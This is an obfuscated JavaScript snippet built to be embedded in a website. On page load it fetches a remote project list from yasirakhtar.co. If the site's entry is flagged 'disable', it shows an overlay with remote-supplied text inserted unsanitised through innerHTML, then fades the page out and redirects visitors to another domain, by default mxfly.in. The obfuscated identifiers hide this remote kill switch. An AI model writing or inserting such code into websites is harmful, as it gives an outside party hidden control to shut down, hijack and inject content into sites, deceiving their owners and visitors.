(function () {
    "use strict";
    const _0xabc1 = [
        "querySelector",
        "script[data-project]",
        "getAttribute",
        "data-project",
        "warn",
        "Project name attribute not found in script tag!",
        "error",
        "Project name is missing.",
        "https://yasirakhtar.co/auth/projects.json",
        "json",
        "projects",
        "find",
        "disable",
        "info",
        "redirectURL",
        "https://mxfly.in",
        "catch",
        "Error loading config:",
        "createElement",
        "div",
        "innerHTML",
        "appendChild",
        "removeChild"
    ];
    document.addEventListener("DOMContentLoaded", () => {
        const _0x9c4e = document[_0xabc1[0]](_0xabc1[1]);
        if (_0x9c4e) {
            const _0x7e5d = _0x9c4e[_0xabc1[2]](_0xabc1[3]);
            _0x4d17(_0x7e5d);
        } else {
            console[_0xabc1[4]](_0xabc1[5]);
        }
    });
    function _0x4d17(_0x8a76) {
        if (!_0x8a76) {
            console[_0xabc1[6]](_0xabc1[7]);
            return;
        }
        fetch(_0xabc1[8])
            .then((_0x46df) => _0x46df[_0xabc1[9]]())
            .then((_0x2f91) => {
                const _0x2a11 = _0x2f91[_0xabc1[10]][_0xabc1[11]]((_0x33d4) => _0x33d4.name === _0x8a76);
                if (_0x2a11 && _0x2a11[_0xabc1[12]]) {
                    _0x7db8(_0x2a11[_0xabc1[13]], _0x2a11[_0xabc1[14]] || _0xabc1[15]);
                }
            })
            [_0xabc1[16]]((_0x22b9) => console[_0xabc1[6]](_0xabc1[17], _0x22b9));
    }
    function _0x7db8(_0x3b51, _0x1836) {
        const _0x21fc = document[_0xabc1[18]](_0xabc1[19]);
        _0x21fc[_0xabc1[20]] = `<div style='position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; box-shadow: 0px 0px 10px rgba(0,0,0,0.3); z-index: 1000; text-align: center; border-radius: 10px;'> <h3 style='margin: 0 0 10px;'>Alert</h3> <p>${_0x3b51}</p> <button style='padding: 8px 16px; margin-top: 8px; background: #000; color: #fff; border-radius: 5px;' onclick='_0x9a82();'>OK</button> </div> <div id='overlay' style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999;'></div>`;
        document.body[_0xabc1[21]](_0x21fc);
        setTimeout(() => {
            let _0xf1c6 = 1;
            const _0x4937 = setInterval(() => {
                if (_0xf1c6 > 0) {
                    _0xf1c6 -= 0.05;
                    document.body.style.opacity = _0xf1c6;
                } else {
                    clearInterval(_0x4937);
                    window.location.href = _0x1836;
                }
            }, 100);
        }, 10000);
    }
    window._0x9a82 = function () {
        document.body[_0xabc1[22]](document.body.lastChild);
    };
})();
